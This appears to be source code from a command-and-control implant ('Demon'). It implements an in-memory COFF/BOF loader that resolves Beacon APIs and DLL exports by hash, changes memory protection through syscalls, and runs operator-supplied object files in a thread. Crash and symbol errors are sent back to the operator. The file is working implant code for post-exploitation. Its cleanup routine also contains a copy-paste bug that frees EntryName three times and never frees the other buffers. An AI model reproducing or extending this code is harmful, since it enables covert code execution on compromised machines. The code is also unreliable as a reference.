
#include <Demon.h>

#include <Core/WinUtils.h>
#include "Common/Defines.h"
#include <Core/MiniStd.h>
#include <Core/Package.h>
#include "Common/Macros.h"
#include <Core/Parser.h>

#include <Inject/InjectUtil.h>

#include <Loader/CoffeeLdr.h>
#include <Loader/ObjectApi.h>

#if defined( __x86_64__ ) || defined( _WIN64 )
    #define COFF_PREP_SYMBOL        0xec6ba2a8
    #define COFF_PREP_SYMBOL_SIZE   6

    #define COFF_PREP_BEACON        0xd0a409b0
    #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
#endif

PVOID CoffeeFunctionReturn = NULL;

LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
{
    PRINTF( "Exception: %p\n", Exception->ExceptionRecord->ExceptionCode )

    // Leave faulty function
    Exception->ContextRecord->Rip = CoffeeFunctionReturn;

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    PackageAddInt32( Package, DEMON_EXCEPTION );
    PackageAddInt32( Package, Exception->ExceptionRecord->ExceptionCode );
    PackageAddInt64( Package, Exception->ExceptionRecord->ExceptionAddress );
    PackageTransmit( Package, NULL, NULL );

    return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL CoffeeProcessSymbol( LPSTR Symbol, PVOID* pFuncAddr )
{
    CHAR        Bak[ 1024 ] = { 0 };
    PVOID       FuncAddr    = NULL;
    PCHAR       SymLibrary  = NULL;
    PCHAR       SymFunction = NULL;
    HMODULE     hLibrary    = NULL;
    DWORD       SymHash     = HashEx( Symbol + COFF_PREP_SYMBOL_SIZE, 0, FALSE );
    DWORD       SymBeacon   = HashEx( Symbol, COFF_PREP_BEACON_SIZE, FALSE );
    ANSI_STRING AnsiString  = { 0 };
    PPACKAGE    Package     = NULL;

    //PRINTF(
    //    "Symbol:         \n"
    //    " - String: %s   \n"
    //    " - Hash  : %lx  \n",
    //    Symbol, SymHash
    //)

    *pFuncAddr = NULL;

    MemCopy( Bak, Symbol, StringLengthA( Symbol ) + 1 );

    if ( SymBeacon == COFF_PREP_BEACON         || // check if this is a Beacon api
         SymHash   == COFFAPI_TOWIDECHAR       ||
         SymHash   == COFFAPI_GETPROCADDRESS   ||
         SymHash   == COFFAPI_LOADLIBRARYA     ||
         SymHash   == COFFAPI_GETMODULEHANDLE  ||
         SymHash   == COFFAPI_FREELIBRARY      )
    {
        //PUTS( "Internal Function" )
        SymFunction = Symbol + COFF_PREP_SYMBOL_SIZE;

        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! BeaconApi[ i ].NameHash )
                break;

            if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
            {
                //PUTS( "Found Beacon api function" )
                *pFuncAddr = BeaconApi[ i ].Pointer;
                return TRUE;
            }
        }

        goto SymbolNotFound;
    }
    else if ( HashEx( Symbol, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL )
    {
        //PUTS( "External Function" )
        SymLibrary  = Bak + COFF_PREP_SYMBOL_SIZE;
        SymLibrary  = StringTokenA( SymLibrary, "$" );
        SymFunction = SymLibrary + StringLengthA( SymLibrary ) + 1;
        hLibrary    = LdrModuleLoad( SymLibrary );

        if ( ! hLibrary )
        {
            PRINTF( "Failed to load library: Lib:[%s] Err:[%d]\n", SymLibrary, NtGetLastError() );
            goto SymbolNotFound;
        }

        AnsiString.Length        = StringLengthA( SymFunction );
        AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
        AnsiString.Buffer        = SymFunction;

        if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
            goto SymbolNotFound;
    }

    return TRUE;

SymbolNotFound:
    Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    PackageAddInt32( Package, DEMON_SYMBOL_NOT_FOUND );
    PackageAddBytes( Package, Symbol, StringLengthA( Symbol ) );
    PackageTransmit( Package, NULL, NULL );

    return FALSE;
}

// This is our function where we can control/get the return address of it to use it in case of a Veh exception
VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
{
    VOID ( *Function ) ( PCHAR , ULONG ) = Address;

    CoffeeFunctionReturn = __builtin_extract_return_addr( __builtin_return_address ( 0 ) );

    // Execute our function
    Function( Argument, Size );

    PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size )
{
    PVOID CoffeeMain     = NULL;
    PVOID VehHandle      = NULL;
    PCHAR SymbolName     = NULL;
    BOOL  Success        = FALSE;
    ULONG FunctionLength = StringLengthA( Function );

    if ( Instance.Config.Implant.CoffeeVeh )
    {
        PUTS( "Register VEH handler..." )
        // Add Veh Debugger in case that our BOF crashes etc.
        VehHandle = Instance.Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
        if ( ! VehHandle )
        {
            CALLBACK_GETLASTERROR
            return FALSE;
        }
    }

    // set all executable sections to RX
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
        if ( Coffee->Section->Characteristics & STYP_TEXT )
        {
            Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, PAGE_EXECUTE_READ );
            if ( ! Success )
            {
                PUTS( "Failed to protect memory" )
                return FALSE;
            }
        }
    }

    // look for the "go" function
    for ( DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++ )
    {
        if ( Coffee->Symbol[ SymCounter ].First.Value[ 0 ] != 0 )
            SymbolName = Coffee->Symbol[ SymCounter ].First.Name;
        else
            SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ SymCounter ].First.Value[ 1 ];

        if ( MemCompare( SymbolName, Function, FunctionLength ) == 0 )
        {
            CoffeeMain = ( Coffee->SecMap[ Coffee->Symbol[ SymCounter ].SectionNumber - 1 ].Ptr + Coffee->Symbol[ SymCounter ].Value );
            break;
        }
    }

    // did we find it?
    if ( ! CoffeeMain )
    {
        PRINTF( "[!] Couldn't find function => %s\n", Function );
        PRINTF( "Function => %s [%d]\n", Function, StringLengthA( Function ) );

        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );

        PackageAddInt32( Package, DEMON_SYMBOL_NOT_FOUND );
        PackageAddBytes( Package, Function, StringLengthA( Function ) );
        PackageTransmit( Package, NULL, NULL );

        return FALSE;
    }

    // make sure the entry point is on executable memory
    Success = FALSE;
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        if ( CoffeeMain >= Coffee->SecMap[ SectionCnt ].Ptr && CoffeeMain < Coffee->SecMap[ SectionCnt ].Ptr + Coffee->SecMap[ SectionCnt ].Size )
        {
            Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
            if ( Coffee->Section->Characteristics & STYP_TEXT )
                Success = TRUE;

            break;
        }
    }

    if ( ! Success )
    {
        PRINTF( "The entry point (%p) is not on executable memory\n", CoffeeMain )
        return FALSE;
    }

    CoffeeFunction( CoffeeMain, Argument, Size );

    // Remove our exception handler
    if ( VehHandle )
        Instance.Win32.RtlRemoveVectoredExceptionHandler( VehHandle );

    return TRUE;
}

VOID CoffeeCleanup( PCOFFEE Coffee )
{
    PVOID    Pointer  = NULL;
    SIZE_T   Size     = 0;
    NTSTATUS NtStatus = 0;

    if ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->ImageBase, Coffee->BofSize, PAGE_READWRITE ) )
        MemSet( Coffee->ImageBase, 0, Coffee->BofSize );

    Pointer = Coffee->ImageBase;
    Size    = Coffee->BofSize;
    if ( ! NT_SUCCESS( ( NtStatus = Instance.Syscall.NtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
    {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->ImageBase, NtGetLastError() );
    }

    if ( Coffee->SecMap )
    {
        MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
        Instance.Win32.LocalFree( Coffee->SecMap );
        Coffee->SecMap = NULL;
    }
}

// Process sections relocation and symbols
BOOL CoffeeProcessSections( PCOFFEE Coffee )
{
    PUTS( "Process Sections" )
    UINT32 Symbol     = 0;
    PVOID  SymString  = NULL;
    PCHAR  FuncPtr    = NULL;
    DWORD  FuncCount  = 0;
    UINT64 OffsetLong = 0;
    UINT32 Offset     = 0;
    PVOID  PrevFunMap = NULL;
    PCHAR  SymName[9] = { 0 };
    PCHAR  SymbolName = NULL;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
        Coffee->Reloc   = U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations;

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            if ( Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Name, 8 );
                SymbolName = SymName;
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 1 ];
            }

            if ( ! CoffeeProcessSymbol( SymbolName, &FuncPtr ) )
            {
                PRINTF( "Symbol '%s' couldn't be resolved\n", SymbolName );
                return FALSE;
            }

            if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL )
            {
                MemCopy( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ), &FuncPtr, sizeof( UINT64 ) );

                Offset  = ( UINT32 ) ( ( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ) ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr != NULL )
            {
                MemCopy( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ), &FuncPtr, sizeof( UINT32 ) );

                Offset  = ( UINT32 ) ( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset;
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_1 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 1;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_2 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 2;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_3 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 3;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_4 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 4;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_5 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
                Offset += 5;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64 && FuncPtr == NULL )
            {
                MemCopy( &OffsetLong, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT64 ) );

                OffsetLong  = Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + OffsetLong;
                OffsetLong += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &OffsetLong, sizeof( UINT64 ) );
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
            {
                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );

                Offset  = ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset )  - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) );
                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;

                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
            }
            else
            {
                if ( FuncPtr )
                {
                    PRINTF( "[!] Relocation type %d for Symbol %s not supported\n", Coffee->Reloc->Type, SymbolName );
                }
                else
                {
                    PRINTF( "[!] Relocation type not found: %d\n", Coffee->Reloc->Type );
                }

                return FALSE;
            }

            Coffee->Reloc = U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC );
        }
    }

    return TRUE;
}

// calculate how many __imp_* function there are
SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
{
    PCHAR SymName[9]    = { 0 };
    PCHAR SymbolName    = NULL;
    ULONG NumberOfFuncs = 0;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
        Coffee->Reloc   = U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations;

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            if ( Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Name, 8 );
                SymbolName = SymName;
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].First.Value[ 1 ];
            }

            // if the symbol starts with __imp_, count it
            if ( HashEx( SymbolName, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL )
                NumberOfFuncs++;

            Coffee->Reloc = U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC );
        }
    }

    return sizeof( UINT64 ) * NumberOfFuncs;
}

DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize )
{
    COFFEE Coffee   = { 0 };
    PVOID  NextBase = NULL;

    PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )

    if ( ! CoffeeData )
    {
        PUTS( "[!] Coffee data is empty" );
        return 1;
    }

    /*
     * The BOF will be allocated as one big chunk of memory
     * all sections are kept page aligned
     * the FunctionMap stored at the end to prevent
     * reloc 32-bit offsets to overflow
     */

    Coffee.Data   = CoffeeData;
    Coffee.Header = Coffee.Data;
    Coffee.Symbol = U_PTR( Coffee.Data ) + Coffee.Header->PointerToSymbolTable;

    if ( Coffee.Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
    {
        PUTS( "The BOF is not AMD64" );
        return 1;
    }

    Coffee.SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee.Header->NumberOfSections * sizeof( SECTION_MAP ) );
    Coffee.FunMapSize = CoffeeGetFunMapSize( &Coffee );

    if ( ! Coffee.SecMap )
    {
        PUTS( "Failed to allocate memory" )
        return 1;
    }

    // calculate the size of the entire BOF
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
    {
        Coffee.Section  = U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt );
        Coffee.BofSize += Coffee.Section->SizeOfRawData;
        Coffee.BofSize  = PAGE_ALLIGN( Coffee.BofSize );
    }

    // at the bottom of the BOF, store the Function map, to ensure all reloc offsets are below 4K
    Coffee.BofSize += Coffee.FunMapSize;

    Coffee.ImageBase = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee.BofSize, PAGE_READWRITE );
    if ( ! Coffee.ImageBase )
    {
        PUTS( "Failed to allocate memory for the BOF" )
        return 1;
    }

    NextBase = Coffee.ImageBase;
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
    {
        Coffee.Section               = U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt );
        Coffee.SecMap[ SecCnt ].Size = Coffee.Section->SizeOfRawData;
        Coffee.SecMap[ SecCnt ].Ptr  = NextBase;

        NextBase += Coffee.Section->SizeOfRawData;
        NextBase  = PAGE_ALLIGN( NextBase );

        PRINTF( "Coffee.SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee.SecMap[ SecCnt ].Ptr )

        MemCopy( Coffee.SecMap[ SecCnt ].Ptr, U_PTR( CoffeeData ) + Coffee.Section->PointerToRawData, Coffee.Section->SizeOfRawData );
    }

    // the FunMap is stored directly after the BOF
    Coffee.FunMap = NextBase;

    if ( ! CoffeeProcessSections( &Coffee ) )
    {
        PUTS( "[*] Failed to process relocation" );
        return 1;
    }

    PUTS( "[*] Execute coffee main\n" );
    CoffeeExecuteFunction( &Coffee, EntryName, ArgData, ArgSize );

    PUTS( "[*] Cleanup memory" );
    CoffeeCleanup( &Coffee );

    return 0;
}

VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
{
    DWORD Status = 0;

    if ( ! Param->EntryName || ! Param->CoffeeData )
        goto ExitThread;

    Status = CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize );
    if ( Status )
    {
        PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
    }

ExitThread:
    if ( Param->EntryName )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param->CoffeeData )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param->ArgData )
    {
        MemSet( Param->EntryName, 0, Param->EntryNameSize );
        Instance.Win32.LocalFree( Param->EntryName );
        Param->EntryName = NULL;
    }

    if ( Param )
    {
        MemSet( Param, 0, sizeof( COFFEE_PARAMS ) );
        Instance.Win32.LocalFree( Param );
        Param = NULL;
    }

    JobRemove( NtCurrentTeb()->ClientId.UniqueThread );
    Instance.Threads--;

    Instance.Win32.RtlExitUserThread( 0 );
}

VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize )
{
    PCOFFEE_PARAMS CoffeeParams = NULL;
    INJECTION_CTX  InjectionCtx = { 0 };

    // Allocate memory
    CoffeeParams                 = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
    CoffeeParams->EntryName      = Instance.Win32.LocalAlloc( LPTR, EntryNameSize );
    CoffeeParams->CoffeeData     = Instance.Win32.LocalAlloc( LPTR, CoffeeDataSize );
    CoffeeParams->ArgData        = Instance.Win32.LocalAlloc( LPTR, ArgSize );
    CoffeeParams->EntryNameSize  = EntryNameSize;
    CoffeeParams->CoffeeDataSize = CoffeeDataSize;
    CoffeeParams->ArgSize        = ArgSize;

    MemCopy( CoffeeParams->EntryName,  EntryName,  EntryNameSize  );
    MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
    MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );

    InjectionCtx.Parameter = CoffeeParams;

    Instance.Threads++;

    if ( ! ThreadCreate( DX_THREAD_SYSCALL, NtCurrentProcess(), CoffeeRunnerThread, &InjectionCtx ) )
    {
        PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
        CALLBACK_GETLASTERROR
    }
}